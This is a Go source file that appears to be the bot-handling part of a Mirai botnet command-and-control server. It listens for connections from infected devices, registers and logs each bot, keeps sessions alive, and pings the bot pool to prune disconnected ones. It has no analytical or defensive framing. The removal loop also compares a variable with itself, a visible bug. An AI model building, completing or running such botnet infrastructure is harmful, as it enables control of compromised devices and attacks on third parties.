package raw

import (
	"fmt"
	"main.go/database"
	"net"
	"strings"
	"time"
)

func MiraiListener() {
	server, err := net.Listen("tcp", database.Config.Mirai.Host+":"+fmt.Sprint(database.Config.Mirai.Port))
	go CheckMirai()
	database.CheckError(err)
	for {
		conn, err := server.Accept()
		if CheckDuplicate(strings.Split(conn.RemoteAddr().String(), ":")[0]) {
			err := conn.Close()
			if err != nil {
				return
			}
			continue
		} else {
			database.Mirai = append(database.Mirai, conn)
			database.CheckError(err)
			go MiraiHandler(conn)
			fmt.Println("[ACCEPTED] Bot (Mirai) Connected (" + conn.RemoteAddr().String() + ")")
			database.SendLog("[ACCEPTED] Bot (Mirai) Connected (" + conn.RemoteAddr().String() + ")")
		}
	}
}

func MiraiHandler(conn net.Conn) {
	buf := make([]byte, 1024)
	for {
		ReadBytes, err := conn.Read(buf)
		if err != nil {
			return
		}
		buf = buf[:ReadBytes]
		if buf[0] == 0 && buf[1] == 0 && buf[2] == 0 && buf[3] > 1 {
			buf := make([]byte, 2)
			for {
				err := conn.SetDeadline(time.Now().Add(180 * time.Second))
				if err != nil {
					return
				}
				if n, err := conn.Read(buf); err != nil || n != len(buf) {
					return
				}
			}
		}

	}
}

func CheckMirai() {
	for {
		if len(database.Mirai) > 0 {
			for _, bot := range database.Mirai {
				_, err := bot.Write([]byte("ping"))
				if err != nil {
					fmt.Println("(DISCONNECTED) Bot (Mirai) Disconnected (" + bot.RemoteAddr().String() + ")")
					database.SendLog("(DISCONNECTED) Bot (Mirai) Disconnected (" + bot.RemoteAddr().String() + ")")
					for i, bot := range database.Mirai {
						if bot.RemoteAddr().String() == bot.RemoteAddr().String() {
							database.Mirai = append(database.Mirai[:i], database.Mirai[i+1:]...)
						}
					}
					err := bot.Close()
					if err != nil {
						return
					}
					continue
				}
			}
			time.Sleep(5 * time.Second)
		}
		continue
	}
}
